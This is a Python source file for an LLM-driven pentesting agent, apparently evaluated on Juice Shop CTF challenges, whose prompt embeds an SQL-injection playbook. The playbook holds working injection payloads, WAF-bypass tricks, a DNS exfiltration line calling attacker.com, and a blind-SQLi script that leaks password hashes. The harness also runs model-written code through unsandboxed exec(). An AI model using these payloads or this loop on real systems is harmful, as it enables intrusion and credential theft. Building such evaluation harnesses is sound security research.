from __future__ import annotations

import traceback
import json
from contextlib import redirect_stderr, redirect_stdout
from io import StringIO
from types import SimpleNamespace
from typing import Dict, Optional, Tuple, Callable, List, ClassVar

from langchain_core.language_models.chat_models import BaseChatModel
from pydantic import BaseModel, Field
from logging import getLogger

from pentest_bot.agent.logger import setup_agent_logger, AgentLogLevels
from src.llm_providers import llm_providers, LLMProviders
from src.utils import dump_llm_messages_pretty, retry_sync, EarlyShutdown

logger = getLogger(AgentLogLevels.AGENT)
full_logger = getLogger(AgentLogLevels.FULL_REQUESTS)

class ExploitStepResult(BaseModel):
    """Result of a single exploit step."""

    reflection: str
    script: str
    answer: Optional[Dict] = None

    model_schema: ClassVar[Dict] = {
        "type": "json_object",
        "required": ["reflection", "script"],
        "properties": {
            "reflection": {
                "type": "string",
                "description": "Natural language reasoning about the next step",
            },
            "script": {"type": "string", "description": "Python code to execute"},
            "answer": {
                "type": "object",
                "description": "Optional answer if exploit is found",
            },
        },
    }

    def is_complete(self):
        return "TASK_COMPLETE" in self.script or "TASK_COMPLETE" in self.reflection


def get_exploit_step_template(
    problem_stmt: Optional[str] = None, prev_turn: Optional[SimpleNamespace] = None
) -> str:
    """Generate the exploit step template based on provided variables."""
    template_parts = []

    # Add problem statement if provided
    if problem_stmt:
        template_parts.append(
            f"""
<problem_stmt>
Here is the CTF problem statement:
{problem_stmt}
</problem_stmt>
"""
        )

    # Add previous turn information if provided
    if prev_turn:
        template_parts.append(
            f"""
<prev_reflection>
Here is the reflection from the previous action:
{prev_turn.reflection}
</prev_reflection>

<prev_script>
Here is the generated script:
{prev_turn.script}
</prev_script>

<prev_output>
Here is the output from the previous action:
{prev_turn.output}
</prev_output>
"""
        )

    # Add the main instruction template
    template_parts.append(
        """
You are a professional web-app CTF/pentesting agent named **PentestBot**.
Your goal is to discover and exploit a vulnerability in the target.
The *only* interaction channel with the target is a Python script that will be
executed immediately. You will receive the combined stdout/stderr of that
execution to inform your next step.

<recommended_workflow>
Recommended workflow per turn:
1. Analyse the previous execution script and output.
2. Decide the next tactical objective.
3. Emit a concise reflection explaining your reasoning.
4. Emit a *complete* Python script implementing that objective.
</recommended_workflow>

Here is a guide:
**A Decision-Tree Playbook for Exploiting SQL-Injection Vulnerabilities**
*(structured as observation ‚Üí follow-up actions; covers error-based, union-based, boolean/time-based, stacked & OOB techniques; engine-agnostic)*

---

### 0. Recon & Setup

| Goal               | Actions                                                                                                                                                                                                                  | Notes                                                                                 |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------- |
| Map attack surface | ‚Ä¢ Identify every endpoint that **reflects external input into a SQL query** (URLs, JSON, HTTP headers, cookies, body params).<br>‚Ä¢ Record HTTP method, content-type, baseline status code, response length, and latency. | Build a tiny wrapper (e.g., `requests` in Python) so you can replay payloads quickly. |
| Normalise baseline | ‚Ä¢ Send the same benign request 3-5 times.<br>‚Ä¢ Store mean latency & response size.                                                                                                                                       | Used later to spot timing gaps / boolean differences.                                 |

---

### 1. First-Wave ‚ÄúDoes Anything Break?‚Äù Tests

**Observation 1.1** ‚Äì Inject single-quote variations into *every* parameter one at a time:

```
'    "    \    %27    %22
```

*If* the server returns **HTTP 500 / stack trace / SQL error text** ‚Üí **goto 2.a (Error-based path)**.
*Else* continue.

**Observation 1.2** ‚Äì Inject tautologies and anti-tautologies:

| Test             | Control           |
| ---------------- | ----------------- |
| `foo' OR '1'='1` | `foo' AND '1'='2` |

Compare response length / structure.

*If* the two responses differ meaningfully (length, rendered records, JSON count) ‚Üí **goto 2.b (Boolean-based path)**.
*Else* continue.

**Observation 1.3** ‚Äì Latency probe (time-based):

```
foo'||(SELECT pg_sleep(5))--
foo' WAITFOR DELAY '0:0:5'--
foo' AND 1=IF(1,SLEEP(5),0)--
```

Measure elapsed time ‚àí baseline.

*If* > 4 s gap appears ‚Üí **goto 2.c (Time-based path)**.
*Else* continue.

**Observation 1.4** ‚Äì UNION echo probe:

```
foo' UNION SELECT NULL--
foo' UNION SELECT NULL,NULL--
...
```

Increase number of `NULL` columns until error disappears.

*If* one variant returns **HTTP 200 plus normal page** ‚Üí **goto 2.d (UNION path)**.
*Else* continue.

If **all** of 1.1‚Äì1.4 fail, attempt **stacked queries** (`;SELECT 1;--`) and **comment styles** (`--`, `#`, `/* ‚Ä¶ */`). No joy? Move to 2.e (OOB).

---

### 2. Exploit Paths

#### 2.a Error-Based

1. **Fingerprint DBMS** from error string (look for `SQLite`, `MySQL`, `PostgreSQL`, `SQL Server` clues).
2. **Leverage verbose errors** to enumerate schema:<br>

   * *MySQL / SQLite:* `foo' AND (SELECT 1/0)--`<br>
   * *Postgres:* `foo' AND (SELECT cast(1 as int)/0)--`
3. **Iterative plan**

   | Observation                                   | Next move                                                         |
   | --------------------------------------------- | ----------------------------------------------------------------- |
   | Error shows *table does not exist*            | Guess table name (`users`, `accounts`, etc.) until error changes. |
   | Error shows *incorrect column count* on UNION | Adjust `NULL` count until error clears.                           |
4. After aligning column count, **UNION-select desired columns**: username, password\_hash, etc.

#### 2.b Boolean-Based (Blind)

1. **Choose yes/no question**: *Does the first user id = 1?*
2. **Craft payload template** (MySQL style):

```
whatever' AND (SELECT CASE WHEN (<predicate>) THEN 1 ELSE 0 END) AND '1'='1
```

3. **Binary search each value**

   * Example character extraction:

     ```
     ascii(substr((SELECT password FROM users LIMIT 1 OFFSET 0),1,1)) > 77
     ```
   * Compare response length; adjust high/low.
4. **Automate** until full hash retrieved.
   (Write loop; 25‚Äì30 req/sec is usually safe.)

#### 2.c Time-Based Blind

1. Same predicates as 2.b but trigger a delay:

```
' AND IF(<predicate>, SLEEP(5), 0)--            -- MySQL
' ; SELECT CASE WHEN <predicate> THEN pg_sleep(5) END--  -- PostgreSQL
```

2. Binary search as above but watch `elapsed > 4 s`.

#### 2.d UNION-Based

> *Prereq: number of columns known from 1.4.*

1. **Find printable column**

   * Replace each `NULL` one at a time with static text (`'QWERTY'`) until it appears in response.
   * Mark its index ‚Äì that‚Äôs your ‚Äúvisible‚Äù column.
2. **Schema guessing loop**

   | Step                | Payload example                                                                               |
   | ------------------- | --------------------------------------------------------------------------------------------- |
   | List tables (MySQL) | `UNION SELECT table_name, NULL ‚Ä¶ FROM information_schema.tables--`                            |
   | List columns        | `UNION SELECT column_name, NULL ‚Ä¶ FROM information_schema.columns WHERE table_name='users'--` |
   | Dump data           | `UNION SELECT username, password_hash ‚Ä¶ FROM users--`                                         |
3. If quotes are filtered, use concatenation/operators (`UNION/*comment*/SELECT`) or different quoting (`0x71776572`).

#### 2.e Out-of-Band (OOB)

1. **DNS exfil:**

```
' UNION SELECT load_file(concat('//',username,'.attacker.com'))--
```

2. **HTTP exfil (MSSQL xp\_dirtree or MySQL outfile)** ‚Äì requires loose DB settings; attempt last.

---

### 3. General Payload Hygiene

| Problem                    | Mitigation                                                             |
| -------------------------- | ---------------------------------------------------------------------- |
| Filtered single quotes `'` | Use double quotes `"`, backticks \` (MySQL), hex-encoded (`0x616263`). |
| Stripped spaces            | Replace with `/**/`, `+`, `%0a`.                                       |
| URL encoding               | Always test `%27`, `%2527` (double encode) variants.                   |
| WAF timeouts               | Add random comment blocks to bypass signature rules.                   |

---

### 4. Automation Skeleton (Python)

```python
# Minimal blind-SQLi enumerator (boolean & timing hybrid).
# Always use double quotes and tabs.

import requests, time, string

TARGET = "https://victim.tld/rest/search?q="
CHARSET = string.ascii_lowercase + string.digits + ":$"

def latency(payload: str) -> float:
	start = time.time()
	requests.get(TARGET + payload, timeout=15)
	return time.time() - start

def leak_char(pos: int) -> str:
	lo, hi = 32, 126  # printable ASCII range
	while lo < hi:
		mid = (lo + hi) // 2
		predicate = f"ascii(substr((SELECT password_hash FROM users LIMIT 1),{pos},1))>{mid}"
		payload = f"xyz' AND IF({predicate}, SLEEP(5), 0)--"
		if latency(payload) > 4:
			lo = mid + 1
		else:
			hi = mid
	return chr(lo)

hash_val = ""
for i in range(1, 33):		# typical 32-char hash
	char = leak_char(i)
	hash_val += char
	print(i, hash_val)
```

---

### 5. Stopping Conditions & Validation

* **Stop** once no more distinct usernames returned or `NULL` rows appear.
* **Validate** hashes: length matches algorithm (MD5 = 32-hex, bcrypt starts `$2b$`, PBKDF2 128 bits, etc.).
* Cross-check by logging in or by comparing with public wordlists (optional, ethics permitting).

---

### 6. Common Pitfalls

1. **Client-side filtering fooled you** ‚Äì test raw requests, not just via browser.
2. **SQLite quirks** ‚Äì no `information_schema`; use `sqlite_master`.
3. **Postgres uses `-- ` (double-dash-space)**; omit space and it ignores comment.
4. **MSSQL** ‚Äì `UNION SELECT NULL` fails if datatypes mismatch; cast everything to `varchar`.
5. **Stacked queries** disabled by default on MySQL `<5.6` ‚Äì rely on UNION or timing.

---

### 7. Ethics & Cleanup

* Obtain written permission for every target.
* Scrub logs or disclose responsibly.
* Never store credential hashes unencrypted; prove access, then delete.

---

#### Quick Path Selector (cheat sheet)

```
            START
              |
         quote error?
        /            \
     yes(2.a)        no
                     |
             union column count?
           /                      \
         yes(2.d)              no
                                |
                        bool diff or timing?
                       /               \
                     yes            out-of-band (2.e)
             (2.b/2.c)
```

Follow the branch until hashes (or data of interest) are exfiltrated. Iterate, automate, and adapt.


If you find the answer according to criteria defined in problem_stmt, then return the answer
Otherwise return null for answer


Return your answer in JSON using the ExploitStepResult schema:
{
        "type": "json_object",
        "required": ["reflection", "script"],
        "properties": {
            "reflection": {
                "type": "string",
                "description": "Natural language reasoning about the next step",
            },
            "script": {"type": "string", "description": "Python code to execute"},
            "answer": {
                "type": "object",
                "description": "Optional answer if exploit is found",
            },
        },
}
"""
    )

    return "".join(template_parts)


class PythonInterpreter:
    """Very small wrapper that runs untrusted Python code and captures output."""

    def __init__(self, shared_globals: Optional[Dict] = None) -> None:
        self._globals: Dict = shared_globals or {}

    def run(self, code: str) -> str:
        """Execute *code* and return the concatenated stdout+stderr text."""
        stdout_buf = StringIO()
        stderr_buf = StringIO()

        try:
            with redirect_stdout(stdout_buf), redirect_stderr(stderr_buf):
                exec(code, self._globals, {})
        except Exception:  # pylint: disable=broad-except
            traceback.print_exc(file=stderr_buf)

        stdout_text = stdout_buf.getvalue()
        stderr_text = stderr_buf.getvalue()
        return stdout_text + ("\n" + stderr_text if stderr_text else "")


@retry_sync(max_retries=3, exceptions=(Exception, ValueError), exc_class=EarlyShutdown)
def exploit_step(
    llm: BaseChatModel,
    problem_stmt: str,
    prev_turn: Optional[SimpleNamespace] = None,
) -> ExploitStepResult:
    """
    Execute a single exploit step using the LLM.

    Args:
        llm: The language model to use
        problem_stmt: The CTF problem statement
        prev_turn: Optional previous turn information

    Returns:
        ExploitStepResult containing the next action to take
    """
    # Generate the template with the provided variables
    formatted_template = get_exploit_step_template(problem_stmt, prev_turn)

    messages = [{"role": "user", "content": formatted_template}]

    full_logger.info(f"[PROMPT EXPLOIT STEP]:\n{dump_llm_messages_pretty(messages)}")

    res = llm.invoke(messages, response_format=ExploitStepResult.model_schema)
    result = ExploitStepResult(**json.loads(res.content))

    logger.info(f"[EXPLOIT STEP] Reflection:\n{result.reflection.strip()}")
    logger.info(f"[EXPLOIT STEP] Generated script:\n{result.script.rstrip()}")
    if result.answer:
        logger.info(f"[EXPLOIT STEP] Found answer: {result.answer}")

    return result


class PentestSession:
    """Drives the LLM ‚Üî interpreter feedback loop."""

    def __init__(
        self,
        problem_stmt: str,
        model: LLMProviders,
        max_steps: int = 12,
        success_condition: str = "",
        eval_fn: Optional[Callable] = None,
    ) -> None:
        self.problem_stmt = problem_stmt
        self.max_steps = max_steps
        self.success_condition = success_condition
        self._model = model
        self._interp = PythonInterpreter()
        self._success = False
        self._steps = 0

        # Set up success evaluation function
        if eval_fn:
            self._is_success = eval_fn
        elif self.success_condition:
            self._is_success = self._create_llm_evaluator()
        else:
            # Always succeed (accept the agent's answer) if no eval is provided
            self._is_success = lambda x: True

    def _create_llm_evaluator(self) -> Callable:
        """Create an LLM-based evaluator for success condition."""

        def llm_evaluate(answer: str) -> bool:
            if not self.success_condition or not answer:
                return False

            evaluation_prompt = f"""
You are evaluating whether a given answer satisfies a success condition.

Success Condition: {self.success_condition}
Answer to Evaluate: {answer}

Determine if the answer satisfies the success condition. Respond with only "TRUE" if it does, or "FALSE" if it doesn't.
"""

            messages = [{"role": "user", "content": evaluation_prompt}]

            try:
                res = self._model.get_client("default").invoke(messages)
                response = res.content.strip().upper()
                return "TRUE" in response
            except Exception as e:
                logger.warning(f"LLM evaluation failed: {e}")
                return False

        return llm_evaluate

    def run(self) -> None:
        """Run the conversation loop until success or exhaustion."""
        prev_turn: Optional[SimpleNamespace] = None

        for step in range(1, self.max_steps + 1):
            logger.info(f"========== STEP {step} ==========")

            # Execute exploit step
            result = exploit_step(
                llm=self._model.get_client("default"),
                problem_stmt=self.problem_stmt,
                prev_turn=prev_turn,
            )

            if result.answer:
                if self._is_success(result.answer):
                    logger.info("Agent successfully completed task with answer.")
                    self._success = True
                    return
                else:
                    raise ValueError(f"Wrong answer! : {result.answer}")

            # Execute the script
            execution_result = self._interp.run(result.script)
            full_logger.info(
                "Full execution output:\n%s",
                execution_result,
            )
            logger.info(
                "Truncated execution output (truncated to 8k chars):\n%s",
                execution_result[:8000],
            )

            # Prepare previous‚Äëturn context for next iteration
            prev_turn = SimpleNamespace(
                reflection=result.reflection,
                script=result.script,
                output=execution_result,
            )
            self._steps += 1

        logger.warning(
            "üíÄ Maximum steps (%d) reached without confirmed exploit.", self.max_steps
        )

    def result(self):
        return self._success, self._steps, self.max_steps


def start_agent(
    challenge: ExploitChallenge,
    eval_name: str,
    model: LLMProviders,
    max_steps: int,
    use_answer: bool,
    vuln_app_url: str,
) -> tuple[bool, int, int]:

    try:
        problem_statement = challenge.prompt.format(url=vuln_app_url)
        success_condition = challenge.success_condition

        setup_agent_logger(eval_name)

        session = PentestSession(
            problem_stmt=problem_statement,
            model=model,
            success_condition=success_condition,
            max_steps=max_steps,
            eval_fn=None,
        )
        session.run()
        return session.result()
    except Exception:
        logger.exception("Uncaught error in %s", eval_name)
        return False, 0, max_steps


if __name__ == "__main__":
    from concurrent.futures import ThreadPoolExecutor
    from dataclasses import dataclass
    from typing import Dict

    from eval.challenges import ExploitChallenge
    from .data import JUICESHOP_EXPLOIT_CHALLENGES

    @dataclass
    class AgentResult:
        eval_name: str
        success: bool
        steps: int
        max_steps: int

    # USE_ANSWER is used to include the answer in the prompt to get the lLM to solve it using the asnwer
    USE_ANSWER = False
    MAX_STEPS = 12
    VULN_APP_URL = "http://localhost:3000"

    results: Dict[str, AgentResult] = {}
    model = llm_providers

    def run_agent(
        challenge: ExploitChallenge, i: int, use_answer: bool, vuln_app_url: str
    ) -> None:
        eval_name = f"{challenge.name}"
        success, steps, max_steps = start_agent(
            challenge, eval_name, model, MAX_STEPS, use_answer, vuln_app_url
        )
        results[eval_name] = AgentResult(eval_name, success, steps, max_steps)

    with ThreadPoolExecutor() as executor:
        executor.map(
            run_agent,
            JUICESHOP_EXPLOIT_CHALLENGES,
            range(len(JUICESHOP_EXPLOIT_CHALLENGES)),
            [USE_ANSWER] * len(JUICESHOP_EXPLOIT_CHALLENGES),
            [VULN_APP_URL] * len(JUICESHOP_EXPLOIT_CHALLENGES),
        )

    # Print results
    print("\nAgent Results:")
    print("-" * 50)
    for eval_name, result in results.items():
        status = "‚úÖ Success" if result.success else "‚ùå Failed"
        print(f"{eval_name}: {status} (Steps: {result.steps}/{result.max_steps})")